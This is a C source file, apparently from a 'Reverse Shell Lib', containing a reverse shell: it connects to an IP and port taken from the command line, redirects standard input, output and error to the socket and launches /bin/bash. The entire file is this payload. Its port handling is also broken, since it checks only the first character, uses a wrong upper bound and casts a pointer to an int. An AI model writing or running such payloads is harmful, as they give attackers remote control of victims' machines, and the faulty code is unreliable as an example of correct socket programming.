/*
    Copyright 2021 by Zackary Morvan, Cyber M Technologies.
    All rights reserved
    This file is part of the Reverse Shell Lib (RSL), and is released 
    under the "MIT License Agreement". Please see the LICENSE file that
    should have been included as a part of this package
*/

#include <stdio.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <ctype.h>

#define DELIM "."

bool is_valid_port(char *port){
    if (isdigit(*port)){
        int z = (int)(*port);
        if (z > 0 && z < 65556){
            return true;
        }
    }
    return false;
}

int main(int argc, char *argv[])
{

    if (argc < 3)
    {
        printf("Invalid arguments");
        return 0;
    }
    
    char *ipContender = argv[1];
    char *portContender = argv[2];
    int is_valid_ip = 1;
    if (is_valid_port(portContender) == true)
    {

            int port = (int)(portContender);
            char *ip = ipContender;

                struct sockaddr_in revsockaddr;

                int sockt = socket(AF_INET, SOCK_STREAM, 0);
                revsockaddr.sin_family = AF_INET;       
                revsockaddr.sin_port = htons(port);
                revsockaddr.sin_addr.s_addr = inet_addr(ip);

                connect(sockt, (struct sockaddr *) &revsockaddr, 
                sizeof(revsockaddr));
                dup2(sockt, 0);
                dup2(sockt, 1);
                dup2(sockt, 2);

                char * const argv[] = {"/bin/bash", NULL};
                execve("/bin/bash", argv, NULL);

                return 0;         
    }
    else
    {
            printf("Invalid port for payload");
            return 0;
    }
    
     
    
}